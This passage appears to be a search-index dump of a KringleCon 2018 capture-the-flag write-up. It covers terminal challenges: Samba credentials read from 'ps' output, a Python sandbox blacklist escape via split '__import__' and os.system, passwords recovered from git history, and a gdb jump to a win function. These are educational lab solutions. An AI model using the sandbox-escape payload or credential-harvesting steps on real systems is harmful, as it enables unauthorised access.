webpage on Plaintext Credentials in Commands: https://blog.rackspace.com/passwords-on-the-command-line-visible-to-ps Solution When user credentials are passed to a program as options on the command line, that data can be discovered by using the process list command 'ps'. By default, ps only shows a condensed version of the command that was run, but by adding -w to the list of options, it will expand the output to contain the entire command. elf@a9fa7c1c0588:~$ ps -efww USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.2 0.0 17952 2952 pts/0 Ss 02:53 0:00 /bin/bash /sbin/init root 10 0.0 0.0 49532 3180 pts/0 S 02:53 0:00 sudo -u manager /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload root 11 0.0 0.0 49532 3244 pts/0 S 02:53 0:00 sudo -E -u manager /usr/bin/python /home/manager/report-check.py root 15 0.0 0.0 45320 3068 pts/0 S 02:53 0:00 sudo -u elf /bin/bash manager 16 0.0 0.0 33848 8080 pts/0 S 02:53 0:00 /usr/bin/python /home/manager/report-check.py manager 17 0.0 0.0 9500 2428 pts/0 S 02:53 0:00 /bin/bash /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload elf 18 0.0 0.0 18208 3272 pts/0 S 02:53 0:00 /bin/bash manager 21 0.0 0.0 4196 680 pts/0 S 02:53 0:00 sleep 60 root 23 0.0 0.0 316664 15408 ? Ss 02:53 0:00 /usr/sbin/smbd root 24 0.0 0.0 308372 5772 ? S 02:53 0:00 /usr/sbin/smbd root 25 0.0 0.0 308364 4532 ? S 02:53 0:00 /usr/sbin/smbd root 27 0.0 0.0 316664 5820 ? S 02:53 0:00 /usr/sbin/smbd elf 30 0.0 0.0 36636 2856 pts/0 R+ 02:53 0:00 ps auxww We can see here that the username is report-upload and the password is directreindeerflatterystable, a nod to the popular \"correct horse battery staple\" xkcd comic . elf@c4110f38517c:~$ ls -l total 4 -rw-r--r-- 1 elf elf 513 Dec 27 02:53 report.txt elf@c4110f38517c:~$ smbclient //localhost/report-upload directreindeerflatterystable -U report-upload WARNING: The syslog option is deprecated Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian] smb: \\ put report.txt putting file report.txt as \\report.txt (250.5 kb/s) (average 250.5 kb/s) smb: \\ Terminated elf@c4110f38517c:~$ You have found the credentials I just had forgot, And in doing so you ve saved me trouble untold. Going forward we ll leave behind policies old, Building separate accounts for each elf in the lot. -Wunorse Openslae","title":"Stall Mucking Report"},{"location":"Terminals/4-stallmucking.html#stall-mucking-report","text":"Location: East Wing","title":"Stall Mucking Report"},{"location":"Terminals/4-stallmucking.html#problem","text":"Thank you Madam or Sir for the help that you bring! I was wondering how I might rescue my day. Finished mucking out stalls of those pulling the sleigh, My report is now due or my KRINGLE s in a sling! There s a samba share here on this terminal screen. What I normally do is to upload the file, With our network credentials (we ve shared for a while). When I try to remember, my memory s clean! Be it last night s nog bender or just lack of rest, For the life of me I can t send in my report. Could there be buried hints or some way to contort, Gaining access - oh please now do give it your best! -Wunorse Openslae Complete this challenge by uploading the elf s report.txt file to the samba share at //localhost/report-upload/","title":"Problem"},{"location":"Terminals/4-stallmucking.html#hints","text":"Wunorse Openslae introduces this terminal: What was that password? Golly, passwords may be the end of all of us. Good guys can't remember them, and bad guess can guess them! I've got to upload my chore report to my manager's inbox, but I can't remember my password. Still, with all the automated tasks we use, I'll bet there's a way to find it in memory... Wunorse also provides a link to a webpage on Plaintext Credentials in Commands: https://blog.rackspace.com/passwords-on-the-command-line-visible-to-ps","title":"Hints"},{"location":"Terminals/4-stallmucking.html#solution","text":"When user credentials are passed to a program as options on the command line, that data can be discovered by using the process list command 'ps'. By default, ps only shows a condensed version of the command that was run, but by adding -w to the list of options, it will expand the output to contain the entire command. elf@a9fa7c1c0588:~$ ps -efww USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.2 0.0 17952 2952 pts/0 Ss 02:53 0:00 /bin/bash /sbin/init root 10 0.0 0.0 49532 3180 pts/0 S 02:53 0:00 sudo -u manager /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload root 11 0.0 0.0 49532 3244 pts/0 S 02:53 0:00 sudo -E -u manager /usr/bin/python /home/manager/report-check.py root 15 0.0 0.0 45320 3068 pts/0 S 02:53 0:00 sudo -u elf /bin/bash manager 16 0.0 0.0 33848 8080 pts/0 S 02:53 0:00 /usr/bin/python /home/manager/report-check.py manager 17 0.0 0.0 9500 2428 pts/0 S 02:53 0:00 /bin/bash /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload elf 18 0.0 0.0 18208 3272 pts/0 S 02:53 0:00 /bin/bash manager 21 0.0 0.0 4196 680 pts/0 S 02:53 0:00 sleep 60 root 23 0.0 0.0 316664 15408 ? Ss 02:53 0:00 /usr/sbin/smbd root 24 0.0 0.0 308372 5772 ? S 02:53 0:00 /usr/sbin/smbd root 25 0.0 0.0 308364 4532 ? S 02:53 0:00 /usr/sbin/smbd root 27 0.0 0.0 316664 5820 ? S 02:53 0:00 /usr/sbin/smbd elf 30 0.0 0.0 36636 2856 pts/0 R+ 02:53 0:00 ps auxww We can see here that the username is report-upload and the password is directreindeerflatterystable, a nod to the popular \"correct horse battery staple\" xkcd comic . elf@c4110f38517c:~$ ls -l total 4 -rw-r--r-- 1 elf elf 513 Dec 27 02:53 report.txt elf@c4110f38517c:~$ smbclient //localhost/report-upload directreindeerflatterystable -U report-upload WARNING: The syslog option is deprecated Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian] smb: \\ put report.txt putting file report.txt as \\report.txt (250.5 kb/s) (average 250.5 kb/s) smb: \\ Terminated elf@c4110f38517c:~$ You have found the credentials I just had forgot, And in doing so you ve saved me trouble untold. Going forward we ll leave behind policies old, Building separate accounts for each elf in the lot. -Wunorse Openslae","title":"Solution"},{"location":"Terminals/5-pythonescape.html","text":"Python Escape from LA Location: Balcony Problem I m another elf in trouble, Caught within this Python bubble. Here I clench my merry elf fist - Words get filtered by a black list! Can t remember how I got stuck, Try it - maybe you ll have more luck? For this challenge, you are more fit. Beat this challenge - Mark and Bag it! -SugarPlum Mary To complete this challenge, escape Python and run ./i_escaped Hints SugarPlum Mary introduces this terminal challenge saying: I'm glad you're here; my terminal is trapped inside a python! Or maybe my python is trapped inside a terminal? SugarPlum also suggests that we watch Mark Baggett's KringleCon talk on Escaping Python Shells. Solution Python provides many ways to access the underlying system it is being run on. We're given an environment where some of these have been disabled, and our job is to find one that still works. Following the methodology layed out in Mark Baggett's talk, I started with some common techniques which were blocked, then found a way that worked. import Use of the command import is prohibited for this question. exec Use of the command exec is prohibited for this question. eval built-in function eval Import and exec are both blocked but eval isn't, so we build on that next. os = eval( __import__( os ) ) Use of the command import is prohibited for this question. os = eval( __imp + ort__( os ) ) os.system( id ) Use of the command os.system is prohibited for this question. Splitting import in half makes the error go away, but we're still prohibited from using os.system. hohoho = eval( __imp + ort__( os ) ) hohoho.system( id ) uid=1000(elf) gid=1000(elf) groups=1000(elf) 0 Substituting a different name for os works, and now we can solve the challenge. hohoho.system( ./i_escaped ) Loading, please wait...... ____ _ _ | _ \\ _ _| |_| |__ ___ _ __ | |_) | | | | __| _ \\ / _ \\| _ \\ | __/| |_| | |_| | | | (_) | | | | |_|___ \\__, |\\__|_| |_|\\___/|_| |_| _ _ | ____||___/___ __ _ _ __ ___ __| | | | _| / __|/ __/ _` | _ \\ / _ \\/ _` | | | |___\\__ \\ (_| (_| | |_) | __/ (_| |_| |_____|___/\\___\\__,_| .__/ \\___|\\__,_(_) |_| That s some fancy Python hacking - You have sent that lizard packing! -SugarPlum Mary You escaped! Congratulations! The lesson here seems to be that it's really hard to filter out all the bad things attackers might try to send to your application. It may be more effective to whitelist only known good inputs, otherwise an attacker who knows one more bad input than you will break through your defenses.","title":"Python Escape from LA"},{"location":"Terminals/5-pythonescape.html#python-escape-from-la","text":"Location: Balcony","title":"Python Escape from LA"},{"location":"Terminals/5-pythonescape.html#problem","text":"I m another elf in trouble, Caught within this Python bubble. Here I clench my merry elf fist - Words get filtered by a black list! Can t remember how I got stuck, Try it - maybe you ll have more luck? For this challenge, you are more fit. Beat this challenge - Mark and Bag it! -SugarPlum Mary To complete this challenge, escape Python and run ./i_escaped","title":"Problem"},{"location":"Terminals/5-pythonescape.html#hints","text":"SugarPlum Mary introduces this terminal challenge saying: I'm glad you're here; my terminal is trapped inside a python! Or maybe my python is trapped inside a terminal? SugarPlum also suggests that we watch Mark Baggett's KringleCon talk on Escaping Python Shells.","title":"Hints"},{"location":"Terminals/5-pythonescape.html#solution","text":"Python provides many ways to access the underlying system it is being run on. We're given an environment where some of these have been disabled, and our job is to find one that still works. Following the methodology layed out in Mark Baggett's talk, I started with some common techniques which were blocked, then found a way that worked. import Use of the command import is prohibited for this question. exec Use of the command exec is prohibited for this question. eval built-in function eval Import and exec are both blocked but eval isn't, so we build on that next. os = eval( __import__( os ) ) Use of the command import is prohibited for this question. os = eval( __imp + ort__( os ) ) os.system( id ) Use of the command os.system is prohibited for this question. Splitting import in half makes the error go away, but we're still prohibited from using os.system. hohoho = eval( __imp + ort__( os ) ) hohoho.system( id ) uid=1000(elf) gid=1000(elf) groups=1000(elf) 0 Substituting a different name for os works, and now we can solve the challenge. hohoho.system( ./i_escaped ) Loading, please wait...... ____ _ _ | _ \\ _ _| |_| |__ ___ _ __ | |_) | | | | __| _ \\ / _ \\| _ \\ | __/| |_| | |_| | | | (_) | | | | |_|___ \\__, |\\__|_| |_|\\___/|_| |_| _ _ | ____||___/___ __ _ _ __ ___ __| | | | _| / __|/ __/ _` | _ \\ / _ \\/ _` | | | |___\\__ \\ (_| (_| | |_) | __/ (_| |_| |_____|___/\\___\\__,_| .__/ \\___|\\__,_(_) |_| That s some fancy Python hacking - You have sent that lizard packing! -SugarPlum Mary You escaped! Congratulations! The lesson here seems to be that it's really hard to filter out all the bad things attackers might try to send to your application. It may be more effective to whitelist only known good inputs, otherwise an attacker who knows one more bad input than you will break through your defenses.","title":"Solution"},{"location":"Terminals/6-devopsfail.html","text":"DevOps Fail Location: Balcony Problem Coalbox again, and I ve got one more ask. Sparkle Q. Redberry has fumbled a task. Git pull and merging, she did all the day; With all this gitting, some creds got away. Urging - I scolded, Don t put creds in git! She said, Don t worry - you re having a fit. If I did drop them then surely I could, Upload some new code done up as one should. Though I would like to believe this here elf, I m worried we ve put some creds on a shelf. Any who s curious might find our oops, Please find it fast before some other snoops! Find Sparkle s password, then run the runtoanswer tool. elf@9092171c76b6:~$ Hints Sparkle Redberry introduces this terminal: Hi, I'm Sparkle Redberry! Ugh, can you believe that Elf Resources is poking around? Something about sensitive info in my git repo. I mean, I may have uploaded something sensitive earlier, but it's no big deal. I overwrote it! Care to check my Cranberry Pi terminal and prove me right? Sparkle also provides a link to a webpage on Git commands: https://gist.github.com/hofmannsven/6814451 Sparkle also provides a link to a webpage on finding passwords in git: https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/ Solution Sparkle says he uploaded some sensitive data to the git repository, but removed it by overwriting it with other data. Unfortunately for Sparkle, we can view the change history of files that have been checked in. First thing I do is check to see what files are present, then see if the word password appears in any of them. elf@b85bd43fa6ea:~/kcconfmgmt$ ls -la total 72 drwxr-xr-x 1 elf elf 4096 Nov 14 09:48 . drwxr-xr-x 1 elf elf 4096 Dec 14 16:30 .. drwxr-xr-x 1 elf elf 4096 Nov 14 09:48 .git -rw-r--r-- 1 elf elf 66 Nov 1 15:30 README.md -rw-r--r-- 1 elf elf 1074 Nov 3 20:28 app.js -rw-r--r-- 1 elf elf 31003 Nov 14 09:46 package-lock.json -rw-r--r-- 1 elf elf 537 Nov 14 09:48 package.json drwxr-xr-x 1 elf elf 4096 Nov 2 15:05 public drwxr-xr-x 1 elf elf 4096 Nov 2 15:05 routes drwxr-xr-x 1 elf elf 4096 Nov 14 09:47 server drwxr-xr-x 1 elf elf 4096 Nov 2 15:05 views elf@b85bd43fa6ea:~/kcconfmgmt$ grep -i -R password * public/bower_components/purecss/src/forms/css/forms.css:.pure-form-stacked input[type= password ], server/config/config.js.def: url : mongodb://username:password@127.0.0.1:27017/node-api server/config/passport.js: // change default username and password, to email andpassword server/config/passport.js: passwordField : password , Looks like there are passwords stored in config.js.def and passport.js. Let's take a look at the commit logs and filter those specific lines with grep. elf@71bcde2d228b:~/kcconfmgmt$ git log -p | egrep (mongodb\\:|passwordField) + passwordField : password , + passwordField : password , - url : mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api + url : mongodb://username:password@127.0.0.1:27017/node-api - url : mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:10073/node-api + url : mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api + url : mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:10073/node-api Note Grep's -E option allows you to use extended regular expressions, which gives you additional capabilities like specifying multiple search strings. There's nothing interesting in passwordField, but the mongodb connection string has Sparkle's username and password as sredberry:twinkletwinkletwinkle. elf@b85bd43fa6ea:~/kcconfmgmt$ runtoanswer Loading, please wait...... Enter Sparkle Redberry s password: twinkletwinkletwinkle This ain t I told you so time, but it s true: I shake my head at the goofs we go through. Everyone knows that the gits aren t the place; Store your credentials in some safer space. Congratulations!","title":"DevOps Fail"},{"location":"Terminals/6-devopsfail.html#devops-fail","text":"Location: Balcony","title":"DevOps Fail"},{"location":"Terminals/6-devopsfail.html#problem","text":"Coalbox again, and I ve got one more ask. Sparkle Q. Redberry has fumbled a task. Git pull and merging, she did all the day; With all this gitting, some creds got away. Urging - I scolded, Don t put creds in git! She said, Don t worry - you re having a fit. If I did drop them then surely I could, Upload some new code done up as one should. Though I would like to believe this here elf, I m worried we ve put some creds on a shelf. Any who s curious might find our oops, Please find it fast before some other snoops! Find Sparkle s password, then run the runtoanswer tool. elf@9092171c76b6:~$","title":"Problem"},{"location":"Terminals/6-devopsfail.html#hints","text":"Sparkle Redberry introduces this terminal: Hi, I'm Sparkle Redberry! Ugh, can you believe that Elf Resources is poking around? Something about sensitive info in my git repo. I mean, I may have uploaded something sensitive earlier, but it's no big deal. I overwrote it! Care to check my Cranberry Pi terminal and prove me right? Sparkle also provides a link to a webpage on Git commands: https://gist.github.com/hofmannsven/6814451 Sparkle also provides a link to a webpage on finding passwords in git: https://en.internetwache.org/dont-publicly-expose-git-or-how-we-downloaded-your-websites-sourcecode-an-analysis-of-alexas-1m-28-07-2015/","title":"Hints"},{"location":"Terminals/6-devopsfail.html#solution","text":"Sparkle says he uploaded some sensitive data to the git repository, but removed it by overwriting it with other data. Unfortunately for Sparkle, we can view the change history of files that have been checked in. First thing I do is check to see what files are present, then see if the word password appears in any of them. elf@b85bd43fa6ea:~/kcconfmgmt$ ls -la total 72 drwxr-xr-x 1 elf elf 4096 Nov 14 09:48 . drwxr-xr-x 1 elf elf 4096 Dec 14 16:30 .. drwxr-xr-x 1 elf elf 4096 Nov 14 09:48 .git -rw-r--r-- 1 elf elf 66 Nov 1 15:30 README.md -rw-r--r-- 1 elf elf 1074 Nov 3 20:28 app.js -rw-r--r-- 1 elf elf 31003 Nov 14 09:46 package-lock.json -rw-r--r-- 1 elf elf 537 Nov 14 09:48 package.json drwxr-xr-x 1 elf elf 4096 Nov 2 15:05 public drwxr-xr-x 1 elf elf 4096 Nov 2 15:05 routes drwxr-xr-x 1 elf elf 4096 Nov 14 09:47 server drwxr-xr-x 1 elf elf 4096 Nov 2 15:05 views elf@b85bd43fa6ea:~/kcconfmgmt$ grep -i -R password * public/bower_components/purecss/src/forms/css/forms.css:.pure-form-stacked input[type= password ], server/config/config.js.def: url : mongodb://username:password@127.0.0.1:27017/node-api server/config/passport.js: // change default username and password, to email andpassword server/config/passport.js: passwordField : password , Looks like there are passwords stored in config.js.def and passport.js. Let's take a look at the commit logs and filter those specific lines with grep. elf@71bcde2d228b:~/kcconfmgmt$ git log -p | egrep (mongodb\\:|passwordField) + passwordField : password , + passwordField : password , - url : mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api + url : mongodb://username:password@127.0.0.1:27017/node-api - url : mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:10073/node-api + url : mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api + url : mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:10073/node-api Note Grep's -E option allows you to use extended regular expressions, which gives you additional capabilities like specifying multiple search strings. There's nothing interesting in passwordField, but the mongodb connection string has Sparkle's username and password as sredberry:twinkletwinkletwinkle. elf@b85bd43fa6ea:~/kcconfmgmt$ runtoanswer Loading, please wait...... Enter Sparkle Redberry s password: twinkletwinkletwinkle This ain t I told you so time, but it s true: I shake my head at the goofs we go through. Everyone knows that the gits aren t the place; Store your credentials in some safer space. Congratulations!","title":"Solution"},{"location":"Terminals/7-thesleighbell.html","text":"The Seighbell Location: Balcony Problem I ll hear the bells on Christmas Day Their sweet, familiar sound will play But just one elf, Pulls off the shelf, The bells to hang on Santa s sleigh! Please call me Shinny Upatree I write you now, cause I would be The one who gets - Whom Santa lets The bells to hang on Santa s sleigh! But all us elves do want the job, Conveying bells through wint ry mob To be the one Toy making s done The bells to hang on Santa s sleigh! To make it fair, the Man devised A fair and simple compromise. A random chance, The winner dance! The bells to hang on Santa s sleigh! Now here I need your hacker skill. To be the one would be a thrill! Please do your best, And rig this test The bells to hang on Santa s sleigh! Complete this challenge by winning the sleighbell lottery for Shinny Upatree. elf@062fe4d78ef8:~$ Hints Shinny Upatree introduces this terminal: Hey! Mind giving ole' Shinny Upatree some help? There's a contest I HAVE to win. As long as no one else wins first, I can just keep trying to win the Sleigh Bell Lotto, but this could take forever! I'll bet the GNU Debugger can help us. With the PEDA modules installed, it can be prettier. I mean easier. Shinny also provides a link to a recent SANS Pen Test blog on Using gdb to Call Random Functions: https://pen-testing.sans.org/blog/2018/12/11/using-gdb-to-call-random-functions Solution elf@c69f161150e6:~$ ls -l total 40 lrwxrwxrwx 1 elf elf 12 Dec 14 16:21 gdb - /usr/bin/gdb lrwxrwxrwx 1 elf elf 16 Dec 14 16:21 objdump - /usr/bin/objdump -rwxr-xr-x 1 root root 38144 Dec 14 16:22 sleighbell-lotto First, use the nm command on the slieghbell-lotto program to list its symbol table. Grepping for \"T\" narrows down the results to text entries. elf@c69f161150e6:~$ nm sleighbell-lotto | grep T 0000000000207f40 d _GLOBAL_OFFSET_TABLE_ w _ITM_deregisterTMCloneTable w _ITM_registerTMCloneTable 0000000000208068 D __TMC_END__ 0000000000001620 T __libc_csu_fini 00000000000015b0 T __libc_csu_init 0000000000001624 T _fini 00000000000008c8 T _init 0000000000000a00 T _start 0000000000000c1e T base64_cleanup 0000000000000c43 T base64_decode 0000000000000bcc T build_decoding_table 0000000000000b0a T hmac_sha256 00000000000014ca T main 00000000000014b7 T sorry 0000000000000f18 T tohex 0000000000000fd7 T winnerwinner Looking over the resulting list, winnerwinner sounds interesting. Start up the gdb debugger and set a breakpoint at the main function using break main , then run the program with run . elf@c69f161150e6:~$ gdb -q sleighbell-lotto Reading symbols from sleighbell-lotto...(no debugging symbols found)...done. (gdb) continue The program is not being run. (gdb) break main Breakpoint 1 at 0x14ce (gdb) run Starting program: /home/elf/sleighbell-lotto [Thread debugging using libthread_db enabled] Using host libthread_db library /lib/x86_64-linux-gnu/libthread_db.so.1 . Breakpoint 1, 0x00005555555554ce in main () When the debugger command comes up, type jump winnerwinner to jump into that function, and we get an instant win! (gdb) jump winnerwinner Continuing at 0x555555554fdb. ..... ...... ..,;:::::cccodkkkkkkkkkxdc;. ....... . ;:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx......... :okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.......... .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc.......... .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;. ........ lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:. ...... ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx; :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk; ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc ..................., ,,:lxkkkkkkkkkkkkkd. .......................... ;;:coxkkkkk: ...............................ckd. ............................... ........................... ....................... ....... ... With gdb you fixed the race. The other elves we did out-pace. And now they ll see. They ll all watch me. I ll hang the bells on Santa s sleigh! Congratulations! You ve won, and have successfully completed this challenge. [Inferior 1 (process 25) exited normally] (gdb)","title":"The Seighbell"},{"location":"Terminals/7-thesleighbell.html#the-seighbell","text":"Location: Balcony","title":"The Seighbell"},{"location":"Terminals/7-thesleighbell.html#problem","text":"I ll hear the bells on Christmas Day Their sweet, familiar sound will play But just one elf, Pulls off the shelf, The bells to hang on Santa s sleigh! Please call me Shinny Upatree I write you now, cause I would be The one who gets - Whom Santa lets The bells to hang on Santa s sleigh! But all us elves do want the job, Conveying bells through wint ry mob To be the one Toy making s done The bells to hang on Santa s sleigh! To make it fair, the Man devised A fair and simple compromise. A random chance, The winner dance! The bells to hang on Santa s sleigh! Now here I need your hacker skill. To be the one would be a thrill! Please do your best, And rig this test The bells to hang on Santa s sleigh! Complete this challenge by winning the sleighbell lottery for Shinny Upatree. elf@062fe4d78ef8:~$","title":"Problem"},{"location":"Terminals/7-thesleighbell.html#hints","text":"Shinny Upatree introduces this terminal: Hey! Mind giving ole' Shinny Upatree some help? There's a contest I HAVE to win. As long as no one else wins first, I can just keep trying to win the Sleigh Bell Lotto, but this could take forever! I'll bet the GNU Debugger can help us. With the PEDA modules installed, it can be prettier. I mean easier. Shinny also provides a link to a recent SANS Pen Test blog on Using gdb to Call Random Functions: https://pen-testing.sans.org/blog/2018/12/11/using-gdb-to-call-random-functions","title":"Hints"},{"location":"Terminals/7-thesleighbell.html#solution","text":"elf@c69f161150e6:~$ ls -l total 40 lrwxrwxrwx 1 elf elf 12 Dec 14 16:21 gdb - /usr/bin/gdb lrwxrwxrwx 1 elf elf 16 Dec 14 16:21 objdump - /usr/bin/objdump -rwxr-xr-x 1 root root 38144 Dec 14 16:22 sleighbell-lotto First, use the nm command on the slieghbell-lotto program to list its symbol table. Grepping for \"T\" narrows down the results to text entries. elf@c69f161150e6:~$ nm sleighbell-lotto | grep T 0000000000207f40 d _GLOBAL_OFFSET_TABLE_ w _ITM_deregisterTMCloneTable w _ITM_registerTMCloneTable 0000000000208068 D __TMC_END__ 0000000000001620 T __libc_csu_fini 00000000000015b0 T __libc_csu_init 0000000000001624 T _fini 00000000000008c8 T _init 0000000000000a00 T _start 0000000000000c1e T base64_cleanup 0000000000000c43 T base64_decode 0000000000000bcc T build_decoding_table 0000000000000b0a T hmac_sha256 00000000000014ca T main 00000000000014b7 T sorry 0000000000000f18 T tohex 0000000000000fd7 T winnerwinner Looking over the resulting list, winnerwinner sounds interesting. Start up the gdb debugger and set a breakpoint at the main function using break main , then run the program with run . elf@c69f161150e6:~$ gdb -q sleighbell-lotto Reading symbols from sleighbell-lotto...(no debugging symbols found)...done. (gdb) continue The program is not being run. (gdb) break main Breakpoint 1 at 0x14ce (gdb) run Starting program: /home/elf/sleighbell-lotto [Thread debugging using libthread_db enabled] Using host libthread_db library /lib/x86_64-linux-gnu/libthread_db.so.1 . Breakpoint 1, 0x00005555555554ce in main () When the debugger command comes up, type jump winnerwinner to jump into that function, and we get an instant win! (gdb) jump winnerwinner Continuing at 0x555555554fdb. ..... ...... ..,;:::::cccodkkkkkkkkkxdc;. ....... . ;:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx......... :okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.......... .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc.......... .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;. ........ lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:. ...... ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx; :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk; ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc ..................., ,,:lxkkkkkkkkkkkkkd. .......................... ;;:coxkkkkk: ...............................ckd. ............................... ........................... ....................... ....... ... With gdb you fixed the race. The other elves we did out-pace. And now they ll see. They ll all watch me. I ll hang the bells on Santa s sleigh! Congratulations! You ve won, and have successfully completed this challenge. [Inferior 1 (process 25) exited normally] (gdb)","title":"Solution"},{"location":"Terminals/8-forensics.html","text":"Lethal ForensicELFication Location: East Hall Problem Christmas is coming, and so it would seem, ER (Elf Resources) crushes elves dreams. One tells me she was disturbed by a bloke. He tells me this must be some kind of joke. Please do your best to determine what s real. Has this jamoke, for this elf, got some feels? Lethal forensics ain t my cup of tea; If YOU can fake it, my hero you ll be. One more quick note that might help you complete, Clearing this mess up that s now at your feet. Certain text editors can leave some clue. Did our young Romeo leave one for you? - Tangle Coalbox, ER Investigator Find the first name of the elf of whom a love poem was written. Complete this challenge by submitting that name to runtoanswer. elf@0c65bbb4e3b4:~$ Hints Tangle introduces this terminal: Any chance you can help me with an investigation? Elf Resources assigned me to look into a case, but it seems to require digital forensic skills. Do you know anything about Linux terminal editors and digital traces they leave behind? Apparently editors can leave traces of data behind, but where and how escapes me! Tangle also provides a link to a webpage on Vim Artifacts: https://tm4n6.com/2017/11/15/forensic-relevance-of-vim-artifacts/ Solution In the file .secrets/her/poem.txt, there are two references to NEVERMORE. We also see there's a .viminfo file in the home directory. Viminfo will store the history of commands executed in vi, including as search and substitute commands. This leads us to find that the word Elinore was replaced with NEVERMORE using the vi search and replace command %s/Elinore/NEVERMORE/g . elf@0c65bbb4e3b4:~$ find . . ./.profile ./.bashrc ./.bash_logout ./.bash_history ./.viminfo ./.secrets ./.secrets/her ./.secrets/her/poem.txt ./runtoanswer elf@0c65bbb4e3b4:~$ cat .secrets/her/poem.txt Once upon a sleigh so weary, Morcel scrubbed the grime so dreary, Shining many a beautiful sleighbell bearing cheer and sound so pure-- There he cleaned them, nearly napping, suddenly there came a tapping, As of someone gently rapping, rapping at the sleigh house door. Tis some caroler, he muttered, tapping at my sleigh house door-- Only this and nothing more. Then, continued with more vigor, came the sound he didn t figure, Could belong to one so lovely, walking bout the North Pole grounds. But the truth is, she WAS knocking, cause with him she would be talking, Off with fingers interlocking, strolling out with love newfound? Gazing into eyes so deeply, caring not who sees their rounds. Oh, twould make his heart resound! Hurried, he, to greet the maiden, dropping rag and brush - unlaiden. Floating over, more than walking, moving toward the sound still knocking, Pausing at the elf-length mirror, checked himself to study clearer, Fixing hair and looking nearer, what a hunky elf - not shocking! Peering through the peephole smiling, reaching forward and unlocking: NEVERMORE in tinsel stocking! Greeting her with smile dashing, pearly-white incisors flashing, Telling jokes to keep her laughing, soaring high upon the tidings, Of good fortune fates had borne him. Offered her his dexter forelimb, Never was his future less dim! Should he now consider gliding-- No - they shouldn t but consider taking flight in sleigh and riding Up above the Pole abiding? Smile, she did, when he suggested that their future surely rested, Up in flight above their cohort flying high like ne er before! So he harnessed two young reindeer, bold and fresh and bearing no fear. In they jumped and seated so near, off they flew - broke through the door! Up and up climbed team and humor, Morcel being so adored, By his lovely NEVERMORE! -Morcel Nougat elf@0c65bbb4e3b4:~$ grep NEVERMORE .viminfo $NEVERMORE :%s/Elinore/NEVERMORE/g |2,0,1536607217,, %s/Elinore/NEVERMORE/g","title":"Lethal ForensicELFication"},{"location":"Terminals/8-forensics.html#lethal-forensicelfication","text":"Location: East Hall","title":"Lethal ForensicELFication"},{"location":"Terminals/8-forensics.html#problem","text":"Christmas is coming, and so it would seem, ER (Elf Resources) crushes elves dreams. One tells me she was disturbed by a bloke. He tells me this must be some kind of joke. Please do your best to determine what s real. Has this jamoke, for this elf, got some feels? Lethal forensics ain t my cup of tea; If YOU can fake it, my hero you ll be. One more quick note that might help you complete, Clearing this mess up that s now at your feet. Certain text editors can leave some clue. Did our young Romeo leave one for you? - Tangle Coalbox, ER Investigator Find the first name of the elf of whom a love poem was written. Complete this challenge by submitting that name to runtoanswer. elf@0c65bbb4e3b4:~$","title":"Problem"},{"location":"Terminals/8-forensics.html#hints","text":"Tangle introduces this terminal: Any chance you can help me with an investigation? Elf Resources assigned me to look into a case, but it seems to require digital forensic skills. Do you know anything about Linux terminal editors and digital traces they leave behind? Apparently editors can leave traces of data behind, but where and how escapes me! Tangle also provides a link to a webpage on Vim Artifacts: 